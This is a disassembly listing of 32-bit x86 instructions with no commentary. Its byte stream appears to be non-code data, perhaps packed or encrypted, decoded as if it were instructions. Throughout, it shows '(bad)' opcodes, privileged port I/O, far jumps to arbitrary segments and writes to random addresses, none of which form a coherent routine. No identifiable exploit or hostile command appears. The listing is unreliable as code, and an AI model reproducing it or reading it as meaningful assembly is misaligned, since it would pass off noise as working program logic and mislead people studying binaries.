  409f21:	xor    al,bh
  409f23:	or     BYTE PTR [ebp+0x54],ah
  409f26:	mov    ebp,esp
  409f28:	leave  
  409f29:	test   eax,0x89551821
  409f2e:	stc    
  409f2f:	inc    eax
  409f30:	imul   eax,ebx,0x4ee0803b
  409f36:	cmp    ecx,esp
  409f38:	cld    
  409f39:	xor    BYTE PTR [edx+esi*2],0x64
  409f3d:	jecxz  0x409fba
  409f3f:	push   esp
  409f40:	fcom   QWORD PTR [edx+0x7ececdb9]
  409f46:	add    ebp,DWORD PTR [edi+0x52e88795]
  409f4c:	dec    eax
  409f4d:	shl    BYTE PTR [esi-0x3da1f463],0xad
  409f54:	push   esp
  409f55:	arpl   WORD PTR [edx],ax
  409f57:	cmp    al,0x78
  409f59:	adc    DWORD PTR [ebx],ecx
  409f5b:	push   ecx
  409f5c:	xchg   edx,eax
  409f5d:	fwait
  409f5e:	adc    eax,0x626de0f3
  409f63:	cmc    
  409f64:	fisub  DWORD PTR [ebx+ecx*2-0x66]
  409f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f69:	push   ss
  409f6a:	pop    edi
  409f6b:	push   ebx
  409f6c:	in     al,0xda
  409f6e:	clc    
  409f6f:	xchg   ebp,ebp
  409f71:	imul   edx,DWORD PTR [ebp+ebx*2+0x41],0xffffffdd
  409f76:	gs push es
  409f78:	jmp    0x2e56:0x2c5d1f47
  409f7f:	shl    eax,1
  409f81:	jl     0x409f1c
  409f83:	inc    ecx
  409f84:	xchg   DWORD PTR [edi+ebx*1-0xd5e2b04],eax
  409f8b:	push   edi
  409f8c:	cmc    
  409f8d:	in     al,0x2c
  409f8f:	daa    
  409f90:	jp     0x409fb1
  409f92:	cwde   
  409f93:	ret    
  409f94:	fist   DWORD PTR [ecx]
  409f96:	jmp    0xfafe:0xab0ec373
  409f9d:	pop    DWORD PTR [ecx+0x367abbe8]
  409fa3:	mov    BYTE PTR [ebx-0x25],0xa5
  409fa7:	sbb    esi,DWORD PTR [edi+0x22ddbd7d]
  409fad:	enter  0x37a0,0xa7
  409fb1:	cmp    al,0xbf
  409fb3:	mov    cl,0xa4
  409fb5:	jns    0x409fc5
  409fb7:	pop    esp
  409fb8:	inc    DWORD PTR [ecx+0x16]
  409fbb:	mov    BYTE PTR [edi+edi*1+0x2ce78b92],bl
  409fc2:	cmp    ah,BYTE PTR ds:0xe4d07361
  409fc8:	dec    ecx
  409fc9:	sub    al,0x40
  409fcb:	shl    DWORD PTR [ebp+0x43948241],cl
  409fd1:	pop    esp
  409fd2:	xchg   ebp,eax
  409fd3:	sub    DWORD PTR [esi],ebp
  409fd5:	lock jns 0x40a03e
  409fd8:	outs   dx,DWORD PTR ds:[esi]
  409fd9:	and    al,0x4e
  409fdb:	add    eax,0x243df4d6
  409fe0:	das    
  409fe1:	jo     0x40a05e
  409fe3:	(bad)  
  409fe4:	out    0xcf,eax
  409fe6:	pop    ss
  409fe7:	fucompp 
  409fe9:	jne    0x40a008
  409feb:	les    esp,FWORD PTR [eax+0x389459b5]
  409ff1:	push   ecx
  409ff2:	(bad)  
  409ff3:	aaa    
  409ff4:	das    
  409ff5:	pop    esp
  409ff6:	inc    esp
  409ff7:	ins    DWORD PTR es:[edi],dx
  409ff8:	pop    esi
  409ff9:	imul   edx,DWORD PTR [edx-0x3e347ca7],0xc
  40a000:	aaa    
  40a001:	pop    es
  40a002:	sub    BYTE PTR [ecx-0x1a816460],ch
  40a008:	jge    0x409faf
  40a00a:	pop    es
  40a00b:	add    ebp,DWORD PTR fs:[edx+eiz*4-0x74]
  40a010:	les    ecx,FWORD PTR [esi]
  40a012:	fst    DWORD PTR [eax-0x45]
  40a015:	gs pop esp
  40a017:	aaa    
  40a018:	icebp  
  40a019:	loop   0x409fe1
  40a01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a01c:	ins    DWORD PTR es:[edi],dx
  40a01d:	push   ds
  40a01e:	mov    bl,0xd7
  40a020:	retf   
  40a021:	adc    al,0xf
  40a023:	(bad)  
  40a025:	mov    WORD PTR [ebx+0x498e4a48],ds
  40a02b:	dec    esi
  40a02c:	ss iret 
  40a02e:	fisttp DWORD PTR [edx+0x61]
  40a031:	mov    eax,0xff73e835
  40a036:	lods   al,BYTE PTR ds:[esi]
  40a037:	and    al,0xda
  40a039:	cmp    esp,DWORD PTR [ebx+esi*4+0x4bb3dc3]
  40a040:	ins    BYTE PTR es:[edi],dx
  40a041:	jl     0x40a04d
  40a043:	in     al,0xaf
  40a045:	sbb    al,0x80
  40a047:	jle    0x40a0ba
  40a049:	sti    
  40a04a:	lods   al,BYTE PTR ds:[esi]
  40a04b:	and    eax,DWORD PTR [ebp+0x55]
  40a04e:	add    al,0x1c
  40a050:	scas   al,BYTE PTR es:[edi]
  40a051:	add    BYTE PTR ds:0xf39e53e4,cl
  40a057:	sbb    DWORD PTR [ebp+ebp*8-0x6f],edi
  40a05b:	push   es
  40a05c:	loopne 0x40a0bf
  40a05e:	loopne 0x40a086
  40a060:	stos   BYTE PTR es:[edi],al
  40a061:	call   0xab14:0x14396697
  40a068:	rol    DWORD PTR [edx],1
  40a06a:	jmp    0x2565559b
  40a06f:	ds inc eax
  40a071:	test   al,0xf3
  40a073:	mov    BYTE PTR ds:0xd3c104c3,dl
  40a079:	sti    
  40a07a:	rcr    bh,cl
  40a07c:	repnz out 0x72,al
  40a07f:	jbe    0x40a05b
  40a081:	dec    ebx
  40a082:	xor    al,BYTE PTR [edx]
  40a084:	fimul  DWORD PTR [eax-0x4a7d7e42]
  40a08b:	imul   ebx,DWORD PTR [ebx-0xf],0xd1a36e6d
  40a092:	xchg   BYTE PTR [ebx+0x5b],cl
  40a095:	mov    ss,WORD PTR [eax]
  40a097:	adc    BYTE PTR [ebx+0x7adff934],dl
  40a09d:	in     eax,0xa0
  40a09f:	sub    al,0xfa
  40a0a1:	gs push 0xf504efe2
  40a0a7:	xchg   BYTE PTR [ecx+0x64],bl
  40a0aa:	(bad)  
  40a0ab:	pop    esp
  40a0ac:	and    bl,bl
  40a0ae:	pop    ebx
  40a0af:	pusha  
  40a0b0:	jmp    0x40a0ea
  40a0b2:	sbb    bl,ch
  40a0b4:	fstp   QWORD PTR ss:[esi+0x4bf353a0]
  40a0bb:	(bad)  
  40a0bc:	push   cs
  40a0bd:	mov    edi,DWORD PTR [ebp+0x7ddab4f8]
  40a0c3:	ds (bad) 
  40a0c5:	jmp    0x807d:0x34ca5c04
  40a0cc:	adc    edi,DWORD PTR [esi+0x723e0f38]
  40a0d2:	jmp    0x7bb3:0x80ff2859
  40a0d9:	pop    ecx
  40a0da:	pop    eax
  40a0db:	shr    bl,cl
  40a0dd:	inc    esi
  40a0de:	jo     0x40a155
  40a0e0:	mov    ?,WORD PTR [edx+0x46aaade1]
  40a0e6:	mov    edx,0xc6ec153a
  40a0eb:	sbb    bh,BYTE PTR [ebp+edi*8-0x17]
  40a0ef:	mov    ds:0xba3d2f6f,al
  40a0f4:	int    0x2f
  40a0f6:	icebp  
  40a0f7:	(bad)  
  40a0f8:	outs   dx,DWORD PTR ds:[esi]
  40a0f9:	or     eax,0xe58429b0
  40a0fe:	add    al,0x8d
  40a100:	add    DWORD PTR [edi+esi*8],0x40ef8211
  40a107:	cmp    al,0x14
  40a109:	popf   
  40a10a:	mov    ch,0x92
  40a10c:	jo     0x40a183
  40a10e:	aad    0x32
  40a110:	iret   
  40a111:	lahf   
  40a112:	mov    bh,BYTE PTR [ebp+0x3a]
  40a115:	out    0x19,eax
  40a117:	or     DWORD PTR [edi-0x3d],0x5e
  40a11b:	(bad)  
  40a11c:	mov    edx,ds
  40a11e:	dec    esi
  40a11f:	mov    cs,WORD PTR [ebx]
  40a121:	mov    ah,0x17
  40a123:	ret    0xe1e9
  40a126:	loopne 0x40a150
  40a128:	ins    DWORD PTR es:[edi],dx
  40a129:	mov    fs,ecx
  40a12b:	int    0x67
  40a12d:	jo     0x40a171
  40a12f:	in     al,dx
  40a130:	sbb    dh,al
  40a132:	push   ecx
  40a133:	ins    BYTE PTR es:[edi],dx
  40a134:	aaa    
  40a135:	jecxz  0x40a161
  40a137:	loopne 0x40a102
  40a139:	lock adc dl,cl
  40a13c:	cld    
  40a13d:	mov    ecx,0x64c8fe69
  40a142:	mov    esi,0x4744ed28
  40a147:	outs   dx,BYTE PTR ds:[esi]
  40a148:	cmp    DWORD PTR [edi-0x59],esi
  40a14b:	in     eax,dx
  40a14c:	jg     0x40a146
  40a14e:	cdq    
  40a14f:	mov    ecx,0xff81597f
  40a154:	pop    esp
  40a155:	jbe    0x40a0e3
  40a157:	xlat   BYTE PTR ds:[ebx]
  40a158:	xor    DWORD PTR [edx+0x42],edx
  40a15b:	cmp    cl,bh
  40a15d:	js     0x40a1d7
  40a15f:	xor    al,0x70
  40a161:	arpl   di,di
  40a163:	mov    edx,0x7ba9a0ec
  40a168:	mov    al,0x2d
  40a16a:	mov    eax,ds:0x1b825a80
  40a16f:	ror    BYTE PTR [ebx+ecx*4],0xb9
  40a173:	fs ffree st(7)
  40a176:	jmp    0x3409:0xb61dcd8d
  40a17d:	sub    eax,0xa42a1b4e
  40a182:	imul   ebp,DWORD PTR [ecx],0x676c7edd
  40a188:	mov    dl,0x9f
  40a18a:	xchg   edi,eax
  40a18b:	xchg   ebp,eax
  40a18c:	jl     0x40a11e
  40a18e:	loope  0x40a1b9
  40a190:	inc    edx
  40a191:	fcomp  QWORD PTR ds:0xb0411e4c
  40a197:	dec    esi
  40a198:	pop    esi
  40a199:	mov    edi,eax
  40a19b:	pusha  
  40a19c:	sbb    cl,bl
  40a19e:	jbe    0x40a1f7
  40a1a0:	inc    edx
  40a1a1:	je     0x40a17d
  40a1a3:	rcr    DWORD PTR gs:[esi+0x5dc1dadb],0x67
  40a1ab:	fxch   st(2)
  40a1ad:	and    edx,DWORD PTR [eax+0x10]
  40a1b0:	ss popa 
  40a1b2:	inc    ebp
  40a1b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b4:	aaa    
  40a1b5:	mov    ebx,0x11e95abf
  40a1ba:	lods   al,BYTE PTR ds:[esi]
  40a1bb:	outs   dx,BYTE PTR ds:[esi]
  40a1bc:	cli    
  40a1bd:	inc    BYTE PTR [eax-0x5d1bc5c5]
  40a1c3:	dec    ecx
  40a1c4:	sbb    eax,0xd53ed425
  40a1c9:	(bad)  
  40a1ca:	dec    ebp
  40a1cb:	mov    BYTE PTR [edx+0x7b],ah
  40a1ce:	mov    eax,0x91461348
  40a1d3:	jnp    0x40a21a
  40a1d5:	xchg   esi,eax
  40a1d6:	into   
  40a1d7:	retf   
  40a1d8:	push   esi
  40a1d9:	inc    edi
  40a1da:	into   
  40a1db:	mov    bh,0xa8
  40a1dd:	inc    ecx
  40a1de:	mov    ch,0xc7
  40a1e0:	or     eax,0xc19bf0cb
  40a1e5:	pop    edi
  40a1e6:	mov    esp,0x1fa8cf09
  40a1eb:	adc    esi,DWORD PTR [ecx+0x610a906e]
  40a1f1:	out    dx,eax
  40a1f2:	aad    0x83
  40a1f4:	jb     0x40a1c1
  40a1f6:	mov    al,dh
  40a1f8:	pop    ebp
  40a1f9:	sbb    al,BYTE PTR [eax+esi*2]
  40a1fc:	or     esi,DWORD PTR [esi]
  40a1fe:	and    eax,0x1ac18170
  40a203:	scas   eax,DWORD PTR es:[edi]
  40a204:	add    esi,edx
  40a206:	je     0x40a249
  40a208:	mul    BYTE PTR [esi+0x1c]
  40a20b:	sub    BYTE PTR [edi+eiz*1+0x56],bh
  40a20f:	int    0xc2
  40a211:	aaa    
  40a212:	in     eax,dx
  40a213:	sbb    DWORD PTR [edi+0x29a9900e],0x4c
  40a21a:	adc    edx,ecx
  40a21c:	jb     0x40a1b6
  40a21e:	addr16 aad 0xe2
  40a221:	add    al,BYTE PTR [ebx]
  40a223:	in     eax,dx
  40a224:	cmp    eax,0x250b30f3
  40a229:	pop    es
  40a22a:	shr    bh,cl
  40a22c:	retf   0xdfe5
  40a22f:	inc    DWORD PTR [eax+0x72d407a4]
  40a235:	lods   al,BYTE PTR ds:[esi]
  40a236:	mov    DWORD PTR [ecx-0x45],ebp
  40a239:	sub    al,0x38
  40a23b:	push   eax
  40a23c:	push   eax
  40a23d:	push   es
  40a23e:	lahf   
  40a23f:	dec    edi
  40a240:	call   0x7261f349
  40a245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a246:	and    al,0xe9
  40a248:	loop   0x40a1d2
  40a24a:	iret   
  40a24b:	adc    cl,al
  40a24d:	xchg   ebx,eax
  40a24e:	in     eax,dx
  40a24f:	pop    ecx
  40a250:	sbb    ecx,ebx
  40a252:	mov    ecx,0x8838e0a3
  40a257:	mov    esi,0x7698e468
  40a25c:	cld    
  40a25d:	stos   BYTE PTR es:[edi],al
  40a25e:	aaa    
  40a25f:	dec    ebx
  40a260:	lods   eax,DWORD PTR ds:[esi]
  40a261:	test   edi,edi
  40a263:	pop    ss
  40a264:	jnp    0x40a2ba
  40a266:	sahf   
  40a267:	lock retf 0xfedf
  40a26b:	mov    ds:0x5d5b29aa,al
  40a270:	dec    esi
  40a271:	xchg   ecx,esp
  40a273:	loopne 0x40a2e2
  40a275:	ds xchg ecx,eax
  40a277:	xor    dh,BYTE PTR [eax+0x61efd4fc]
  40a27d:	ret    0x627d
  40a280:	lock fadd QWORD PTR [ebp-0x2d]
  40a284:	in     al,dx
  40a285:	cld    
  40a286:	push   ecx
  40a287:	mov    ecx,esi
  40a289:	fstp   DWORD PTR [eax+eax*2]
  40a28c:	xchg   esp,eax
  40a28d:	add    eax,0xf62b865e
  40a292:	jns    0x40a2ca
  40a294:	adc    al,0x45
  40a296:	cwde   
  40a297:	sub    eax,0xc5856d57
  40a29c:	jecxz  0x40a25f
  40a29e:	jo     0x40a2c5
  40a2a0:	sbb    DWORD PTR [ebp-0x6],ecx
  40a2a3:	xor    BYTE PTR [edx-0x27c571a1],dl
  40a2a9:	fidivr WORD PTR [ebx+ebp*1-0x404572ad]
  40a2b0:	mov    ds:0x2db9dba9,al
  40a2b5:	push   eax
  40a2b6:	(bad)  
  40a2b8:	stc    
  40a2b9:	call   0x494e8bde
  40a2be:	test   al,bl
  40a2c0:	xchg   ebp,eax
  40a2c1:	aas    
  40a2c2:	mov    esp,0x4e9ccef7
  40a2c7:	fdivr  st,st(3)
  40a2c9:	pop    DWORD PTR [edi+ecx*1-0x7a]
  40a2cd:	es sub eax,0xdd1e2a74
  40a2d3:	mov    DWORD PTR [ebx-0x21efb00d],esp
  40a2d9:	jo     0x40a29d
  40a2db:	inc    BYTE PTR [eax+0x20f8b242]
  40a2e1:	dec    ebx
  40a2e2:	xor    al,0x82
  40a2e4:	adc    al,0x69
  40a2e6:	or     bh,cl
  40a2e8:	ds cld 
  40a2ea:	mov    DWORD PTR [ebx+esi*8+0x7d91e24d],esp
  40a2f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2f2:	mov    al,0xa8
  40a2f4:	adc    DWORD PTR [eax+0x49],esp
  40a2f7:	test   bh,dh
  40a2f9:	lods   eax,DWORD PTR ds:[esi]
  40a2fa:	sahf   
  40a2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2fc:	mov    cl,0xeb
  40a2fe:	int    0xd1
  40a300:	ss jecxz 0x40a292
  40a303:	jmp    0x40a29a
  40a305:	das    
  40a306:	mov    al,ds:0x13d53754
  40a30b:	enter  0xcaf1,0x45
  40a30f:	lock and ebp,DWORD PTR [ebp+eax*8-0x66c1c1d3]
  40a317:	xchg   esp,eax
  40a318:	adc    eax,0xb091ffab
  40a31d:	jl     0x40a2de
  40a31f:	and    BYTE PTR [ebx+eax*2+0x8],ah
  40a323:	outs   dx,BYTE PTR cs:[esi]
  40a325:	sbb    ch,BYTE PTR [esi]
  40a327:	dec    ecx
  40a328:	sti    
  40a329:	push   ss
  40a32a:	or     DWORD PTR [edx+0x21],esp
  40a32d:	test   DWORD PTR [ebp+esi*2-0x5],eax
  40a331:	jno    0x40a393
  40a333:	push   ecx
  40a334:	inc    esi
  40a335:	outs   dx,DWORD PTR ds:[esi]
  40a336:	dec    esi
  40a337:	gs pop esi
  40a339:	fimul  DWORD PTR ds:[esi]
  40a33c:	pop    ecx
  40a33d:	int3   
  40a33e:	rcr    DWORD PTR [eax-0x38],cl
  40a341:	inc    ebp
  40a342:	or     eax,0xb8104f25
  40a347:	adc    BYTE PTR [ebx+0x57],0xac
  40a34b:	pop    es
  40a34c:	(bad)  
  40a34d:	imul   edi,ecx,0xffffffed
  40a350:	(bad)  
  40a351:	scas   al,BYTE PTR es:[edi]
  40a352:	nop
  40a353:	in     al,0x84
  40a355:	xor    esp,ebx
  40a357:	sbb    eax,0xed3f3f6b
  40a35c:	dec    edi
  40a35d:	adc    ebp,DWORD PTR [ebx]
  40a35f:	mov    BYTE PTR [edx+0x62],ch
  40a362:	lods   al,BYTE PTR ds:[esi]
  40a363:	pop    esi
  40a364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a365:	retf   0x9dec
  40a368:	jno    0x40a3cc
  40a36a:	mov    ds:0xf0048f0b,al
  40a36f:	shr    BYTE PTR [ecx-0x461b16cf],0xd2
  40a376:	jp     0x40a33d
  40a378:	xchg   esi,eax
  40a379:	ret    0xbcf2
  40a37c:	pop    esp
  40a37d:	adc    eax,0xb84741bd
  40a382:	int3   
  40a383:	cdq    
  40a384:	aad    0xa3
  40a386:	jns    0x40a395
  40a388:	mov    bl,BYTE PTR [ebp-0x77fadb38]
  40a38e:	cdq    
  40a38f:	enter  0x3160,0xa4
  40a393:	xchg   esi,eax
  40a394:	mov    edi,0xf3246796
  40a399:	adc    edi,DWORD PTR [ebp+0x94a275a]
  40a39f:	cmp    ah,BYTE PTR [eax+eax*4-0x3d]
  40a3a3:	enter  0xcfdf,0x70
  40a3a7:	sbb    bl,BYTE PTR [esp+eax*1+0x71]
  40a3ab:	call   0xef2f62a4
  40a3b0:	lods   ax,WORD PTR ds:[esi]
  40a3b2:	pop    esp
  40a3b3:	or     BYTE PTR [ebx+0x41],dl
  40a3b6:	xor    esp,0x5433406c
  40a3bc:	mov    ebp,0x97b3c7c8
  40a3c1:	cmp    al,BYTE PTR [eax-0x1c]
  40a3c4:	clc    
  40a3c5:	popf   
  40a3c6:	xor    bl,ah
  40a3c8:	mov    eax,ds:0xf365569b
  40a3cd:	mov    esi,0xb2e739a5
  40a3d2:	inc    edx
  40a3d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d4:	mov    BYTE PTR [ebx-0x6154eb09],dl
  40a3da:	sub    esi,ecx
  40a3dc:	xchg   edi,eax
  40a3dd:	(bad)  
  40a3de:	shr    BYTE PTR [esp+eax*2+0x7faf3151],1
  40a3e5:	pop    es
  40a3e6:	push   es
  40a3e7:	mov    ds:0xbb2587ad,eax
  40a3ec:	pop    edi
  40a3ed:	icebp  
  40a3ee:	dec    esp
  40a3ef:	inc    edi
  40a3f0:	stos   BYTE PTR es:[edi],al
  40a3f1:	test   eax,0xe4079429
  40a3f6:	daa    
  40a3f7:	pop    ss
  40a3f8:	ret    0x913a
  40a3fb:	aas    
  40a3fc:	xchg   esp,eax
  40a3fd:	dec    eax
  40a3fe:	ror    BYTE PTR [ebp+0x134c35f3],cl
  40a404:	or     DWORD PTR [ebp+0x75889f0b],edx
  40a40a:	pop    esp
  40a40b:	pusha  
  40a40c:	xor    al,0x55
  40a40e:	jg     0x40a3c8
  40a410:	mov    dl,0x35
  40a412:	xor    eax,DWORD PTR [ebx-0xa]
  40a415:	push   es
  40a416:	sbb    dl,bh
  40a418:	call   0x3ff5:0x74c6b978
  40a41f:	aad    0x8a
  40a421:	fidivr WORD PTR [ebx-0x1]
  40a424:	or     al,0x14
  40a426:	xlat   BYTE PTR ds:[ebx]
  40a427:	push   ecx
  40a428:	cmc    
  40a429:	add    eax,0xe09fd7c8
  40a42e:	and    BYTE PTR [edi],0x3a
  40a431:	jb     0x40a47b
  40a433:	aas    
  40a434:	aam    0xc4
  40a436:	push   ebx
  40a437:	mov    esi,0x62d1c926
  40a43c:	(bad)  
  40a43d:	cmp    bh,BYTE PTR [eax-0x31]
  40a440:	fscale 
  40a442:	test   DWORD PTR [ebx+0x43],0xedee1d88
  40a449:	xor    esi,edx
  40a44b:	in     al,dx
  40a44c:	pop    ebx
  40a44d:	mov    bl,0xec
  40a44f:	cmp    dl,al
  40a451:	je     0x40a454
  40a453:	push   ecx
  40a454:	(bad)  
  40a455:	cmp    al,0xca
  40a457:	imul   edi,esi,0x70
  40a45a:	add    ebx,0x635671e9
  40a460:	xchg   edi,eax
  40a461:	cwde   
  40a462:	and    bl,BYTE PTR [eax-0x4a]
  40a465:	jbe    0x40a487
  40a467:	dec    esi
  40a468:	test   eax,0x5a8917e7
  40a46d:	xor    eax,0x36ab0f5a
  40a472:	lods   al,BYTE PTR ds:[esi]
  40a473:	in     eax,0x4e
  40a475:	cs cdq 
  40a477:	je     0x40a4f0
  40a479:	xchg   edx,eax
  40a47a:	lock jno 0x40a4a4
  40a47d:	jge    0x40a4ef
  40a47f:	dec    ebp
  40a480:	xor    cl,bh
  40a482:	sub    al,0x65
  40a484:	jae    0x40a44d
  40a486:	mov    cs,WORD PTR [edi-0x5a]
  40a489:	cmp    DWORD PTR [ecx],esp
  40a48b:	sub    bl,BYTE PTR es:0xdfdd2748
  40a492:	add    ch,dl
  40a494:	mov    al,0xce
  40a496:	ss xchg edi,eax
  40a498:	fwait
  40a499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a49a:	adc    eax,0x9e209dbf
  40a49f:	jp     0x40a4a0
  40a4a1:	inc    eax
  40a4a2:	or     eax,0xc6dab124
  40a4a7:	das    
  40a4a8:	add    DWORD PTR [edi+0x76028565],edx
  40a4ae:	jl     0x40a4ad
  40a4b0:	mov    edi,0xf6a36435
  40a4b5:	sub    ebp,DWORD PTR [edx+ebp*2-0x2d]
  40a4b9:	cmp    BYTE PTR [edi],0xc2
  40a4bc:	mov    edx,0xd134b97e
  40a4c1:	shl    BYTE PTR [ebp-0x67451a1f],cl
  40a4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c8:	pushf  
  40a4c9:	mov    cl,0xfe
  40a4cb:	push   eax
  40a4cc:	mov    ah,0x69
  40a4ce:	fsub   QWORD PTR [edi]
  40a4d0:	das    
  40a4d1:	mov    ch,0x55
  40a4d3:	add    al,0xa8
  40a4d5:	out    dx,al
  40a4d6:	(bad)  
  40a4d7:	loopne 0x40a540
  40a4d9:	int3   
  40a4da:	cmp    BYTE PTR [ebx-0xb0dd072],dl
  40a4e0:	xchg   edi,eax
  40a4e1:	mov    esp,0xc8c05f95
  40a4e6:	mov    ecx,0x397988c9
  40a4eb:	mov    bh,0x5f
  40a4ed:	cdq    
  40a4ee:	inc    ebx
  40a4ef:	push   ebx
  40a4f0:	test   BYTE PTR [ebx+0x80c0a23],ch
  40a4f6:	dec    ebx
  40a4f7:	push   es
  40a4f8:	test   BYTE PTR ds:[edx],cl
  40a4fb:	fs push ecx
  40a4fd:	add    BYTE PTR [eax],dl
  40a4ff:	mov    ch,0x9c
  40a501:	sti    
  40a502:	sub    BYTE PTR [esi+0x1a],ah
  40a505:	mov    ebx,0x5f6c8d32
  40a50a:	lods   eax,DWORD PTR ds:[esi]
  40a50b:	into   
  40a50c:	dec    eax
  40a50d:	out    0x58,eax
  40a50f:	push   eax
  40a510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a511:	mov    dl,0xfc
  40a513:	hlt    
  40a514:	into   
  40a515:	popa   
  40a516:	mov    ch,0xdd
  40a518:	popa   
  40a519:	adc    DWORD PTR [ebp+0x3c],edi
  40a51c:	cdq    
  40a51d:	pop    ebx
  40a51e:	pop    esp
  40a520:	cdq    
  40a521:	jae    0x40a527
  40a523:	cmp    DWORD PTR [ecx+0x3ce59098],esp
  40a529:	push   0xffffffb1
  40a52b:	ffree  st(6)
  40a52d:	test   cl,cl
  40a52f:	add    BYTE PTR [esi],0x2c
  40a532:	retf   0xb1c9
  40a535:	sti    
  40a536:	je     0x40a59e
  40a538:	push   ebp
  40a539:	dec    ebx
  40a53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a53b:	mov    eax,ds:0xc0a7e760
  40a540:	imul   eax,DWORD PTR [ebx-0x7351e46d],0xdbe6132b
  40a54a:	fyl2xp1 
  40a54c:	test   edx,eax
  40a54e:	and    DWORD PTR [ebx+0x4ba692be],esi
  40a554:	or     al,0x68
  40a556:	sbb    esi,ebp
  40a558:	adc    al,0x1c
  40a55a:	(bad)  
  40a55b:	clc    
  40a55c:	adc    al,0xbf
  40a55e:	cdq    
  40a55f:	and    DWORD PTR [ebx-0x38],ebp
  40a562:	into   
  40a563:	pop    ss
  40a564:	ds fs mov eax,0xd07a8403
  40a56b:	and    ebx,esi
  40a56d:	fisttp DWORD PTR [edx+ebp*8-0x52]
  40a571:	adc    DWORD PTR [ebx],edx
  40a573:	dec    edx
  40a574:	sub    al,0x63
  40a576:	dec    edi
  40a577:	add    ebp,DWORD PTR [ecx-0x16379b42]
  40a57d:	mov    BYTE PTR [ebx-0x27e01542],al
  40a583:	xor    eax,0x82f93c5d
  40a588:	ins    BYTE PTR es:[edi],dx
  40a589:	je     0x40a556
  40a58b:	call   0x8f209d78
  40a590:	sti    
  40a591:	sbb    edi,0x44
  40a594:	push   ebp
  40a595:	leave  
  40a596:	and    DWORD PTR [esi],edi
  40a598:	mov    DWORD PTR [ebp+0x71],edi
  40a59b:	out    0xfb,al
  40a59d:	dec    esp
  40a59e:	outs   dx,DWORD PTR ds:[esi]
  40a59f:	cmp    al,0x8e
  40a5a1:	std    
  40a5a2:	in     al,0x75
  40a5a4:	es ins DWORD PTR es:[edi],dx
  40a5a6:	adc    ecx,DWORD PTR [eax+0x5a]
  40a5a9:	rcr    dl,cl
  40a5ab:	jl     0x40a5ae
  40a5ad:	xchg   ebx,eax
  40a5ae:	mov    ds:0x1454b913,al
  40a5b3:	adc    BYTE PTR ds:0x4b387032,al
  40a5b9:	fs call 0xf43:0xa62a6094
  40a5c1:	dec    eax
  40a5c2:	dec    esi
  40a5c3:	pop    edx
  40a5c4:	xchg   DWORD PTR [eax-0x9a42044],ebp
  40a5ca:	ja     0x40a54f
  40a5cc:	aad    0x45
  40a5ce:	pusha  
  40a5cf:	or     al,0x68
  40a5d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d2:	inc    edi
  40a5d3:	es push esp
  40a5d5:	sbb    al,BYTE PTR [esi-0x25]
  40a5d8:	inc    ecx
  40a5d9:	aad    0x1b
  40a5db:	xchg   ebx,eax
  40a5dc:	cmp    ah,BYTE PTR [esi+0x7785fe94]
  40a5e2:	les    edx,FWORD PTR gs:[ebx+0x55f7fea6]
  40a5e9:	and    bl,BYTE PTR [edi+0x4da6bd82]
  40a5ef:	pop    esp
  40a5f0:	or     ecx,edi
  40a5f2:	fs mov eax,0x28bad7e8
  40a5f8:	loope  0x40a600
  40a5fa:	inc    edx
  40a5fb:	iret   
  40a5fc:	inc    edx
  40a5fd:	mov    ebp,0x155690d
  40a602:	stos   BYTE PTR es:[edi],al
  40a603:	int    0xfc
  40a605:	dec    esp
  40a606:	(bad)  
  40a608:	je     0x40a5a2
  40a60a:	(bad)  
  40a60b:	les    ebx,FWORD PTR [edx+0xd]
  40a60e:	push   esp
  40a60f:	pop    edx
  40a610:	dec    esp
  40a611:	push   eax
  40a612:	push   esp
  40a613:	mov    esp,0x6139abf2
  40a618:	std    
  40a619:	call   0xcc1:0x4d5a49c6
  40a620:	sub    BYTE PTR [edx],al
  40a622:	sbb    ch,BYTE PTR [edx]
  40a624:	imul   edi,DWORD PTR [eax],0x4ac2f330
  40a62a:	cmp    bh,BYTE PTR [esi+0x1a]
  40a62d:	outs   dx,BYTE PTR ds:[esi]
  40a62e:	and    ebx,DWORD PTR [esp+ecx*1-0xf06427f]
  40a635:	aam    0x78
  40a637:	mov    edx,0x83b9cd4f
  40a63c:	fist   DWORD PTR [edi+0x5aa648f7]
  40a642:	shr    DWORD PTR [ebx],cl
  40a644:	(bad)  
  40a645:	test   DWORD PTR [edi+ebx*8+0x4bb34cb7],0x898a73de
  40a650:	sahf   
  40a651:	xchg   BYTE PTR [ecx+0x24],al
  40a654:	pop    esi
  40a655:	fimul  DWORD PTR [edx-0x3a]
  40a658:	stc    
  40a659:	xor    eax,0xc409b897
  40a65e:	enter  0x7e5b,0xfe
  40a662:	jae    0x40a602
  40a664:	shl    DWORD PTR [edx-0xbbf60f9],0x16
  40a66b:	or     DWORD PTR ds:0x71c14d35,edx
  40a671:	xor    al,0xc9
  40a673:	mov    bh,0xf6
  40a675:	aam    0x32
  40a677:	xor    ebp,DWORD PTR [edi-0x9]
  40a67a:	imul   ebp,DWORD PTR ds:0xb080936c,0xffffffd0
  40a681:	jae    0x40a6e5
  40a683:	(bad)  
  40a684:	pop    edx
  40a685:	(bad)  
  40a686:	out    0xa4,al
  40a688:	shl    BYTE PTR [edi],1
  40a68a:	xlat   BYTE PTR ds:[ebx]
  40a68b:	jmp    0x5a8045a4
  40a690:	adc    DWORD PTR [edi],ebp
  40a692:	and    DWORD PTR [esi-0x70408f03],0xffffffd5
  40a699:	pop    ds
  40a69a:	adc    eax,0xa97c0b91
  40a69f:	push   cs
  40a6a0:	sub    BYTE PTR [ebp-0x7c217a71],0xb6
  40a6a7:	int3   
  40a6a8:	xchg   ebp,eax
  40a6a9:	pop    edx
  40a6aa:	sahf   
  40a6ab:	mov    dh,0x30
  40a6ad:	push   eax
  40a6ae:	jb     0x40a655
